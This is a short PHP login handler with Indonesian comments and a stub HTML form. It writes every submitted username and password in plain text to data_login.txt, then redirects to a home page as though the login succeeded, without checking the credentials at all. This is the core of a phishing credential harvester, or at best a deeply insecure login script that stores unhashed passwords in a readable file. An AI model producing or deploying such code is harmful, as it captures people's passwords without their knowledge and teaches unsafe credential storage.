<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Buka file atau buat file baru untuk menyimpan data
    $file = fopen("data_login.txt", "a");
    // Tulis data ke file
    fwrite($file, "Username: " . $username . ", Password: " . $password . "\n");
    // Tutup file
    fclose($file);

    // Redirect pengguna ke halaman utama setelah login berhasil
    header("Location: homeIn.html");
    exit();
} else {
    echo "Metode permintaan tidak valid.";
}
?>

<form action="save_login.php" method="post">
    <!-- ... (elemen form lainnya) ... -->
</form>
